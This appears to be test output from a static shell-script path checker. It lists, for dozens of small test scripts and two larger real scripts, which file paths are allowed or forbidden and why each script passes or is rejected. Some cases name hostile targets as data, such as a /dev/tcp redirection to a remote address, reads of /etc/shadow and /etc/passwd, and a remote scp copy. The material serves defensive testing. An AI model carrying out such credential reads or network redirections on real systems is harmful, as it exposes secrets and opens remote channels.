COMMAND_RC=3
=== tilde_user ===
PATHSCOPE shell=tilde_user.sh
PATHSCOPE resolved_count=1 unresolved_count=1
PATH value=/safe/~gatea/secret verdict=ALLOW rule=/safe/** sources=NONE uses=line=2:cat
UNRESOLVED line=2 reason=allowlisted path has no preregistered-constant provenance expression=~gatea/secret
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== tilde_home ===
PATHSCOPE shell=tilde_home.sh
PATHSCOPE resolved_count=1 unresolved_count=1
PATH value=/safe/~/secret verdict=ALLOW rule=/safe/** sources=NONE uses=line=2:cat
UNRESOLVED line=2 reason=allowlisted path has no preregistered-constant provenance expression=~/secret
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== symlink_lexical ===
PATHSCOPE shell=symlink_lexical.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/safe/link/passwd verdict=ALLOW rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== redir_rw ===
PATHSCOPE shell=redir_rw.sh
PATHSCOPE resolved_count=1 unresolved_count=1
PATH value=/safe/> verdict=ALLOW rule=/safe/** sources=NONE uses=line=2:redirection <
UNRESOLVED line=2 reason=allowlisted path has no preregistered-constant provenance expression=>
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== redir_clobber ===
PATHSCOPE shell=redir_clobber.sh
PATHSCOPE resolved_count=0 unresolved_count=2
UNRESOLVED line=2 reason=opaque command y has no registered path-argument contract expression=y
UNRESOLVED line=2 reason=redirection has no target expression=>
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== redir_amp ===
PATHSCOPE shell=redir_amp.sh
PATHSCOPE resolved_count=1 unresolved_count=1
PATH value=/etc/z verdict=FORBID rule=- sources=NONE uses=line=2:redirection &>
UNRESOLVED line=2 reason=opaque command ls has no registered path-argument contract expression=ls
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== fddup ===
PATHSCOPE shell=fddup.sh
PATHSCOPE resolved_count=0 unresolved_count=0
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== exec_redir ===
PATHSCOPE shell=exec_redir.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/safe/out verdict=ALLOW rule=/safe/** sources=ROOT uses=line=2:redirection >
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== devtcp ===
PATHSCOPE shell=devtcp.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/dev/tcp/198.51.100.10/8790 verdict=FORBID rule=- sources=NONE uses=line=2:redirection <
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== devtcp_allow ===
PATHSCOPE shell=devtcp_allow.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/dev/tcp/127.0.0.1/8790 verdict=FORBID rule=- sources=NONE uses=line=2:redirection <
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== heredoc ===
PATHSCOPE shell=heredoc.sh
PATHSCOPE resolved_count=0 unresolved_count=3
UNRESOLVED line=2 reason=here input is outside the accepted static path subset expression=EOF
UNRESOLVED line=3 reason=opaque command passwd has no registered path-argument contract expression=passwd
UNRESOLVED line=4 reason=opaque command EOF has no registered path-argument contract expression=EOF
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== heredoc_subst ===
PATHSCOPE shell=heredoc_subst.sh
PATHSCOPE resolved_count=1 unresolved_count=3
PATH value=/etc/shadow verdict=FORBID rule=- sources=NONE uses=line=3:cat
UNRESOLVED line=2 reason=here input is outside the accepted static path subset expression=EOF
UNRESOLVED line=3 reason=dynamic command name: command substitution expression=$(cat /etc/shadow)
UNRESOLVED line=4 reason=opaque command EOF has no registered path-argument contract expression=EOF
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== heredoc_quoted ===
PATHSCOPE shell=heredoc_quoted.sh
PATHSCOPE resolved_count=1 unresolved_count=3
PATH value=/etc/shadow verdict=FORBID rule=- sources=NONE uses=line=3:cat
UNRESOLVED line=2 reason=here input is outside the accepted static path subset expression='EOF'
UNRESOLVED line=3 reason=dynamic command name: command substitution expression=$(cat /etc/shadow)
UNRESOLVED line=4 reason=opaque command EOF has no registered path-argument contract expression=EOF
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== herestring ===
PATHSCOPE shell=herestring.sh
PATHSCOPE resolved_count=0 unresolved_count=0
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== array ===
PATHSCOPE shell=array.sh
PATHSCOPE resolved_count=0 unresolved_count=2
UNRESOLVED line=2 reason=array assignment is outside the accepted scalar subset expression=A=(...)
UNRESOLVED line=3 reason=unsupported parameter expansion ${A[0]} expression="${A[0]}"
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== brace ===
PATHSCOPE shell=brace.sh
PATHSCOPE resolved_count=1 unresolved_count=2
PATH value=/safe verdict=ALLOW rule=/safe/** sources=NONE uses=line=2:cat
UNRESOLVED line=2 reason=allowlisted path has no preregistered-constant provenance expression=/safe/
UNRESOLVED line=2 reason=opaque command a,b has no registered path-argument contract expression=a,b
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== arith ===
PATHSCOPE shell=arith.sh
PATHSCOPE resolved_count=0 unresolved_count=1
UNRESOLVED line=2 reason=command substitution expression="/safe/$((1+1))"
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== param_default ===
PATHSCOPE shell=param_default.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/etc/passwd verdict=FORBID rule=- sources=NONE uses=line=2:cat
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== param_subst ===
PATHSCOPE shell=param_subst.sh
PATHSCOPE resolved_count=0 unresolved_count=1
UNRESOLVED line=2 reason=unsupported parameter expansion ${ROOT/x/y} expression="${ROOT/x/y}"
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== ansic ===
PATHSCOPE shell=ansic.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/etc/passwd verdict=FORBID rule=- sources=NONE uses=line=2:cat
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== continuation ===
PATHSCOPE shell=continuation.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/safe/input verdict=ALLOW rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== backtick ===
PATHSCOPE shell=backtick.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/etc/shadow verdict=FORBID rule=- sources=NONE uses=line=2:cat
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== glob ===
PATHSCOPE shell=glob.sh
PATHSCOPE resolved_count=0 unresolved_count=1
UNRESOLVED line=2 reason=glob expansion makes the path set dynamic expression="$ROOT"/*
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== source ===
PATHSCOPE shell=source.sh
PATHSCOPE resolved_count=1 unresolved_count=1
PATH value=/safe/lib.sh verdict=ALLOW rule=/safe/** sources=ROOT uses=line=2:source
UNRESOLVED line=2 reason=sourced values are outside the closed scalar input set expression=source
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== dot_source ===
PATHSCOPE shell=dot_source.sh
PATHSCOPE resolved_count=1 unresolved_count=1
PATH value=/safe/lib.sh verdict=ALLOW rule=/safe/** sources=ROOT uses=line=2:.
UNRESOLVED line=2 reason=sourced values are outside the closed scalar input set expression=.
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== xargs ===
PATHSCOPE shell=xargs.sh
PATHSCOPE resolved_count=0 unresolved_count=2
UNRESOLVED line=2 reason=opaque command xargs has no registered path-argument contract expression=xargs
UNRESOLVED line=2 reason=opaque command xargs may forward a path or endpoint expression="$ROOT/list"
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== multipath ===
PATHSCOPE shell=multipath.sh
PATHSCOPE resolved_count=2 unresolved_count=0
PATH value=/etc/b verdict=FORBID rule=- sources=NONE uses=line=2:install
PATH value=/safe/a verdict=ALLOW rule=/safe/** sources=ROOT uses=line=2:install
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== scp_remote ===
PATHSCOPE shell=scp_remote.sh
PATHSCOPE resolved_count=0 unresolved_count=2
UNRESOLVED line=2 reason=remote-path grammar needs an explicit transport parser expression="$ROOT/a"
UNRESOLVED line=2 reason=remote-path grammar needs an explicit transport parser expression=gatea@198.51.100.10:/tmp/b
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== nc_client ===
PATHSCOPE shell=nc_client.sh
PATHSCOPE resolved_count=0 unresolved_count=0
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== grep_files ===
PATHSCOPE shell=grep_files.sh
PATHSCOPE resolved_count=0 unresolved_count=2
UNRESOLVED line=2 reason=opaque command grep has no registered path-argument contract expression=grep
UNRESOLVED line=2 reason=opaque command grep may forward a path or endpoint expression="$ROOT/f"
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== sed_prog ===
PATHSCOPE shell=sed_prog.sh
PATHSCOPE resolved_count=0 unresolved_count=2
UNRESOLVED line=2 reason=opaque command sed has no registered path-argument contract expression=sed
UNRESOLVED line=2 reason=opaque command sed may forward a path or endpoint expression="$ROOT/f"
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== func_positional ===
PATHSCOPE shell=func_positional.sh
PATHSCOPE resolved_count=0 unresolved_count=1
UNRESOLVED line=2 reason=dynamic shell parameter $1 expression="$1"
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== func_body ===
PATHSCOPE shell=func_body.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/safe/ok verdict=ALLOW rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== case_loop ===
PATHSCOPE shell=case_loop.sh
PATHSCOPE resolved_count=2 unresolved_count=0
PATH value=/etc/other verdict=FORBID rule=- sources=NONE uses=line=5:cat
PATH value=/safe/a verdict=ALLOW rule=/safe/** sources=ROOT uses=line=4:cat
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== terminal_stat ===
PATHSCOPE shell=terminal_stat.sh
PATHSCOPE resolved_count=1 unresolved_count=1
PATH value=/safe/conf verdict=ALLOW rule=/safe/conf [terminal] sources=NONE uses=line=2:stat
UNRESOLVED line=2 reason=allowlisted path has no preregistered-constant provenance expression=/safe/conf
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== terminal_cat ===
PATHSCOPE shell=terminal_cat.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/safe/conf verdict=FORBID rule=- sources=NONE uses=line=2:cat
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== assign_prefix ===
PATHSCOPE shell=assign_prefix.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/safe/f verdict=ALLOW rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== assign_prefix_allow ===
PATHSCOPE shell=assign_prefix_allow.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/safe/f verdict=ALLOW rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== assign_bare ===
PATHSCOPE shell=assign_bare.sh
PATHSCOPE resolved_count=0 unresolved_count=0
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== assign_benign ===
PATHSCOPE shell=assign_benign.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/safe/f verdict=ALLOW rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== assign_export ===
PATHSCOPE shell=assign_export.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/safe/f verdict=ALLOW rule=/safe/** sources=ROOT uses=line=3:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== assign_env ===
PATHSCOPE shell=assign_env.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/safe/f verdict=ALLOW rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== assign_multi ===
PATHSCOPE shell=assign_multi.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/safe/f verdict=ALLOW rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== c2_list_prefix ===
PATHSCOPE shell=c2_list_prefix.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/safe/f verdict=ALLOW rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== c2_list_env ===
PATHSCOPE shell=c2_list_env.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/safe/f verdict=ALLOW rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== c2_list_export ===
PATHSCOPE shell=c2_list_export.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/safe/f verdict=ALLOW rule=/safe/** sources=ROOT uses=line=3:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== c2_list_bare_first ===
PATHSCOPE shell=c2_list_bare_first.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/safe/f verdict=ALLOW rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== c2_list_space ===
PATHSCOPE shell=c2_list_space.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/safe/f verdict=ALLOW rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== c2_relative ===
PATHSCOPE shell=c2_relative.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/safe/f verdict=ALLOW rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== c2_empty_member ===
PATHSCOPE shell=c2_empty_member.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/safe/f verdict=ALLOW rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== c2_quoted_space ===
PATHSCOPE shell=c2_quoted_space.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/safe/f verdict=ALLOW rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== c2_escaped_space ===
PATHSCOPE shell=c2_escaped_space.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/safe/f verdict=ALLOW rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== c2_command_text ===
PATHSCOPE shell=c2_command_text.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/safe/f verdict=ALLOW rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== c2_uri_forbid ===
PATHSCOPE shell=c2_uri_forbid.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/safe/f verdict=ALLOW rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== c2_uri_allow ===
PATHSCOPE shell=c2_uri_allow.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/safe/f verdict=ALLOW rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== c2_env_quoted ===
PATHSCOPE shell=c2_env_quoted.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/safe/f verdict=ALLOW rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== c2_bare_soname ===
PATHSCOPE shell=c2_bare_soname.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/safe/f verdict=ALLOW rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== c2_allow_list ===
PATHSCOPE shell=c2_allow_list.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/safe/f verdict=ALLOW rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== c2_benign_scalars ===
PATHSCOPE shell=c2_benign_scalars.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/safe/f verdict=ALLOW rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== c2_benign_words ===
PATHSCOPE shell=c2_benign_words.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/safe/f verdict=ALLOW rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== c2_words_with_path ===
PATHSCOPE shell=c2_words_with_path.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/safe/f verdict=ALLOW rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== c3_ws_relative ===
PATHSCOPE shell=c3_ws_relative.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/safe/f verdict=ALLOW rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== c3_ws_later_word ===
PATHSCOPE shell=c3_ws_later_word.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/safe/f verdict=ALLOW rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== c3_uri_list ===
PATHSCOPE shell=c3_uri_list.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/safe/f verdict=ALLOW rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== c3_uri_pair ===
PATHSCOPE shell=c3_uri_pair.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/safe/f verdict=ALLOW rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== c3_colon_whole ===
PATHSCOPE shell=c3_colon_whole.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/safe/f verdict=ALLOW rule=/safe/f sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== c3_empty_only ===
PATHSCOPE shell=c3_empty_only.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/safe/f verdict=ALLOW rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== c3_empty_only_out ===
PATHSCOPE shell=c3_empty_only_out.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/safe/f verdict=ALLOW rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== c3_cmdtext_noslash ===
PATHSCOPE shell=c3_cmdtext_noslash.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/safe/f verdict=ALLOW rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== c4_export_quoted ===
PATHSCOPE shell=c4_export_quoted.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/safe/f verdict=ALLOW rule=/safe/** sources=ROOT uses=line=3:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== c4_export_quoted_space ===
PATHSCOPE shell=c4_export_quoted_space.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/safe/f verdict=ALLOW rule=/safe/** sources=ROOT uses=line=3:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== c4_declare_quoted ===
PATHSCOPE shell=c4_declare_quoted.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/safe/f verdict=ALLOW rule=/safe/** sources=ROOT uses=line=3:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== c4_readonly_quoted ===
PATHSCOPE shell=c4_readonly_quoted.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/safe/f verdict=ALLOW rule=/safe/** sources=ROOT uses=line=3:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== c4_typeset_quoted ===
PATHSCOPE shell=c4_typeset_quoted.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/safe/f verdict=ALLOW rule=/safe/** sources=ROOT uses=line=3:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== c4_local_quoted ===
PATHSCOPE shell=c4_local_quoted.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/safe/f verdict=ALLOW rule=/safe/** sources=ROOT uses=line=4:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== c4_export_opaque ===
PATHSCOPE shell=c4_export_opaque.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/safe/f verdict=ALLOW rule=/safe/** sources=ROOT uses=line=3:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== c4_env_quoted_ctl ===
PATHSCOPE shell=c4_env_quoted_ctl.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/safe/f verdict=ALLOW rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== c4_export_plain_ctl ===
PATHSCOPE shell=c4_export_plain_ctl.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/safe/f verdict=ALLOW rule=/safe/** sources=ROOT uses=line=3:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== c3_scalar_ctl ===
PATHSCOPE shell=c3_scalar_ctl.sh
PATHSCOPE resolved_count=1 unresolved_count=0
PATH value=/safe/f verdict=ALLOW rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted
COMMAND_RC=0
=== RP6-P0 with placeholder.constants ===
PATHSCOPE verdict=REJECT rc=3 reason=input_parse_error line=7 detail=path contains an unresolved angle-bracket placeholder
COMMAND_RC=3
=== RP7-WPI-RO with placeholder.constants ===
PATHSCOPE verdict=REJECT rc=3 reason=input_parse_error line=7 detail=path contains an unresolved angle-bracket placeholder
COMMAND_RC=3
=== RP6-P0 with real.constants ===
PATHSCOPE shell=RP6-P0.sh
PATHSCOPE resolved_count=1 unresolved_count=39
PATH value=/dev/null verdict=FORBID rule=- sources=NONE uses=line=398:redirection >,line=400:redirection >
UNRESOLVED line=398 reason=opaque command builtin has no registered path-argument contract expression=builtin
UNRESOLVED line=400 reason=opaque command builtin has no registered path-argument contract expression=builtin
UNRESOLVED line=410 reason=opaque command argument: unpinned variable RUNID expression="$RUNID"
UNRESOLVED line=410 reason=opaque command rp0_require_safe_component has no registered path-argument contract expression=rp0_require_safe_component
UNRESOLVED line=412 reason=opaque command argument: unpinned variable EV_STAGE_ID expression="$EV_STAGE_ID"
UNRESOLVED line=412 reason=opaque command rp0_require_safe_component has no registered path-argument contract expression=rp0_require_safe_component
UNRESOLVED line=814 reason=dynamic command name: unpinned variable rl expression="$rl"
UNRESOLVED line=845 reason=unpinned variable P0_LOOKUP expression="$resolved"
UNRESOLVED line=857 reason=opaque command  has no registered path-argument contract expression=
UNRESOLVED line=857 reason=opaque command argument: unpinned variable p expression="$p"
UNRESOLVED line=938 reason=opaque command  has no registered path-argument contract expression=
UNRESOLVED line=938 reason=opaque command  may forward a path or endpoint expression="$P0_FD_SELF"
UNRESOLVED line=945 reason=opaque command  has no registered path-argument contract expression=
UNRESOLVED line=945 reason=opaque command  may forward a path or endpoint expression="$P0_FD_SELF"
UNRESOLVED line=952 reason=opaque command  has no registered path-argument contract expression=
UNRESOLVED line=952 reason=opaque command argument: unpinned variable EV_LOG expression="$EV_LOG"
UNRESOLVED line=992 reason=opaque command  has no registered path-argument contract expression=
UNRESOLVED line=992 reason=opaque command argument: unpinned variable flag expression="$flag"
UNRESOLVED line=1156 reason=array assignment is outside the accepted scalar subset expression=p0_pw_parts=(...)
UNRESOLVED line=1166 reason=relative path depends on unpinned PWD expression=<
UNRESOLVED line=1168 reason=dynamic command name: unpinned variable P0_GETENT expression="$P0_GETENT"
UNRESOLVED line=1320 reason=opaque command  has no registered path-argument contract expression=
UNRESOLVED line=1320 reason=opaque command argument: unpinned variable path expression="$path"
UNRESOLVED line=1348 reason=opaque command  has no registered path-argument contract expression=
UNRESOLVED line=1348 reason=opaque command argument: unpinned variable path expression="$path"
UNRESOLVED line=1386 reason=opaque command  has no registered path-argument contract expression=
UNRESOLVED line=1386 reason=opaque command  may forward a path or endpoint expression=/
UNRESOLVED line=1394 reason=opaque command  has no registered path-argument contract expression=
UNRESOLVED line=1394 reason=opaque command  may forward a path or endpoint expression=/
UNRESOLVED line=1473 reason=opaque command  has no registered path-argument contract expression=
UNRESOLVED line=1561 reason=opaque command  has no registered path-argument contract expression=
UNRESOLVED line=1561 reason=opaque command argument: unpinned variable p expression="$p"
UNRESOLVED line=1586 reason=opaque command  has no registered path-argument contract expression=
UNRESOLVED line=1586 reason=opaque command argument: unpinned variable p expression="$p"
UNRESOLVED line=1673 reason=opaque command  has no registered path-argument contract expression=
UNRESOLVED line=1673 reason=opaque command argument: unpinned variable d expression="$d"
UNRESOLVED line=1731 reason=dynamic shell parameter $1 expression="$py"
UNRESOLVED line=1766 reason=opaque command  has no registered path-argument contract expression=
UNRESOLVED line=1766 reason=opaque command argument: unpinned variable py expression="$py"
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== RP7-WPI-RO with real.constants ===
PATHSCOPE shell=RP7-WPI-RO.sh
PATHSCOPE resolved_count=3 unresolved_count=69
PATH value=/opt/mtc-bridge/venvs/2ce41e34bceb599d80af24c5c33d835820ec321b/bin/python verdict=ALLOW rule=/opt/mtc-bridge/venvs/2ce41e34bceb599d80af24c5c33d835820ec321b/** sources=WPI_VENV_ROOT uses=line=999:test
PATH value=/proc/self/mountinfo verdict=FORBID rule=- sources=NONE uses=line=633:redirection <
PATH value=/proc/uptime verdict=FORBID rule=- sources=NONE uses=line=232:redirection <
UNRESOLVED line=190 reason=unpinned variable WPI_LEAF_FD expression="$fd"
UNRESOLVED line=246 reason=dynamic shell parameter $1 expression="$leaf"
UNRESOLVED line=268 reason=dynamic shell parameter $1 expression="$leaf"
UNRESOLVED line=314 reason=unpinned variable EV_DIR expression="$EV_DIR"
UNRESOLVED line=315 reason=dynamic command name: unpinned variable WPI_ENV expression="$WPI_ENV"
UNRESOLVED line=317 reason=unpinned variable WPI_LEAF_FD expression="$efd"
UNRESOLVED line=317 reason=unpinned variable WPI_LEAF_FD expression="$ofd"
UNRESOLVED line=334 reason=unpinned variable WPI_LEAF_FD expression=/dev/fd/"$ofd"
UNRESOLVED line=335 reason=unpinned variable WPI_LEAF_FD expression=/dev/fd/"$efd"
UNRESOLVED line=350 reason=dynamic shell parameter $3 expression="$file"
UNRESOLVED line=351 reason=opaque command -s has no registered path-argument contract expression=-s
UNRESOLVED line=351 reason=opaque command argument: dynamic shell parameter $3 expression="$file"
